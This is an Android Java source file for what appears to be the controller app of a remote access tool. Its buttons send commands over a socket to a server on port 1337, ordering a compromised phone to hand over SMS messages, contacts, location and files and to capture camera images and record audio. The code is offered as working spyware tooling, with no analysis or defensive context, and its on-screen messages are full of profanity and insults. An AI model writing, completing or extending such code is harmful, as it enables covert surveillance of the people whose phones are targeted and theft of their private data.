package com.fuckshit.client;

import android.app.Activity;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;
import java.net.*;
import java.io.*;

public class MainActivity extends Activity {
    TextView statusText;
    Button connectBtn, getSmsBtn, getContactsBtn, getLocationBtn, getCameraBtn, getAudioBtn, getFilesBtn;
    Socket socket;
    PrintWriter out;
    BufferedReader in;
    private final String SERVER_IP = "your_server_ip_here"; // Später dynamisch über Relay
    private final int SERVER_PORT = 1337;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        
        statusText = findViewById(R.id.status_text);
        connectBtn = findViewById(R.id.connect_btn);
        getSmsBtn = findViewById(R.id.get_sms_btn);
        getContactsBtn = findViewById(R.id.get_contacts_btn);
        getLocationBtn = findViewById(R.id.get_location_btn);
        getCameraBtn = findViewById(R.id.get_camera_btn);
        getAudioBtn = findViewById(R.id.get_audio_btn);
        getFilesBtn = findViewById(R.id.get_files_btn);

        connectBtn.setOnClickListener(v -> connectToServer());
        getSmsBtn.setOnClickListener(v -> sendCommand("get_sms"));
        getContactsBtn.setOnClickListener(v -> sendCommand("get_contacts"));
        getLocationBtn.setOnClickListener(v -> sendCommand("get_location"));
        getCameraBtn.setOnClickListener(v -> sendCommand("capture_camera"));
        getAudioBtn.setOnClickListener(v -> sendCommand("record_audio"));
        getFilesBtn.setOnClickListener(v -> sendCommand("get_files"));
    }

    private void connectToServer() {
        new Thread(() -> {
            try {
                socket = new Socket(SERVER_IP, SERVER_PORT);
                out = new PrintWriter(socket.getOutputStream(), true);
                in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
                out.println("{\"command\": \"connect_client\"}");
                String response = in.readLine();
                runOnUiThread(() -> {
                    statusText.setText("Connected to fucking server, you crazy shit!");
                    Toast.makeText(this, "Fucking connected, bastard!", Toast.LENGTH_SHORT).show();
                });
            } catch (IOException e) {
                runOnUiThread(() -> {
                    statusText.setText("Connection failed, damn fucking error: " + e.getMessage());
                    Toast.makeText(this, "Fucking error, asshole!", Toast.LENGTH_SHORT).show();
                });
            }
        }).start();
    }

    private void sendCommand(String command) {
        if (socket == null || !socket.isConnected()) {
            Toast.makeText(this, "Not fucking connected, you dumb shit!", Toast.LENGTH_SHORT).show();
            return;
        }
        new Thread(() -> {
            try {
                out.println("{\"command\": \"" + command + "\"}");
                String response = in.readLine();
                runOnUiThread(() -> {
                    statusText.setText("Command result, fucking hell: " + response);
                    Toast.makeText(this, "Fucking command sent, bastard!", Toast.LENGTH_SHORT).show();
                });
            } catch (IOException e) {
                runOnUiThread(() -> Toast.makeText(this, "Fucking error sending command, shit!", Toast.LENGTH_SHORT).show());
            }
        }).start();
    }
}
